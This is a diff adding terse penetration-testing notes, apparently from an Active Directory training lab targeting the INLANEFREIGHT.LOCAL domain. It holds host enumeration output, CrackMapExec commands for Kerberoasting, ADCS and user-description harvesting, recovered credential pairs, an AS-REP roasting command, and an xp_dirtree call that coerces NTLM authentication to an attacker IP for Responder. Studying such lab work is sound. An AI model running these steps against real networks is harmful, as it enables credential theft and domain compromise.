@@ -1,0 +1,66 @@
+TODOS:
+- Attacking Common Services
+- Footprinting
+- Pivoting, Tunneling, and Port Forwarding
+- AD
+- AD Bloodhound
+
+
+#### Assessment ###
+IOXIDRES... 10.129.204.182  445    SQL01            Address: 172.16.15.15
+IOXIDRES... 10.129.204.182  445    SQL01            Address: 10.129.204.182
+IOXIDRES... 10.129.204.182  445    SQL01            Address: dead:beef::a1bf:a38c:2715:3b93
+IOXIDRES... 10.129.204.182  445    SQL01            Address: dead:beef::13f
+
+Names:
+172.16.15.3    dc01.INLANEFREIGHT.LOCAL  - ldap/LDAP signing is NOT enforced 
+172.16.15.15   sql01.INLANEFREIGHT.LOCAL - spooler
+172.16.15.20   dev01.INLANEFREIGHT.LOCAL - spooler
+10.129.246.181 sql01.INLANEFREIGHT.LOCAL - spooler
+
+IPs:
+172.16.15.15
+172.16.15.20
+172.16.15.3
+10.129.204.182
+
+RID
+INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
+
+Juliette:Password1
+
+
+Stes:
+1. kerberoasting
+cme ldap --kerberoasting kerberoasting.out ==> Juliette:Password1
+
+cme ldap -M adcs 
+
+ADCS  Found PKI Enrollment Server: DC01.INLANEFREIGHT.LOCAL
+ADCS        Found CN: INLANEFREIGHT-DC01-CA
+
+cme ldap -M adcs -o SERVER=
+ADCS                                                Using PKI CN: INLANEFREIGHT-DC01-CA
+ADCS                                                Found Certificate Template: DirectoryEmailReplication
+ADCS                                                Found Certificate Template: DomainControllerAuthentication
+ADCS                                                Found Certificate Template: KerberosAuthentication
+ADCS                                                Found Certificate Template: EFSRecovery
+ADCS                                                Found Certificate Template: EFS
+ADCS                                                Found Certificate Template: DomainController
+ADCS                                                Found Certificate Template: WebServer
+ADCS                                                Found Certificate Template: Machine
+ADCS                                                Found Certificate Template: User
+ADCS                                                Found Certificate Template: SubCA
+ADCS                                                Found Certificate Template: Administrator
+
+cme ldap -M user-desc
+Atul:hooters1
+
+cme mssql -q select
+
+cme ldap --get-sid: Domain SID S-1-5-21-3514599724-1682172728-4136368490
+--trusted-for-delegation:DC01$
+
+
+???? GetNPUsers.py -dc-ip IP DOMAIN -userfile/-users
+???? Responder : mssql exec master..xp_dirtree '\\10.10.15.92\test'
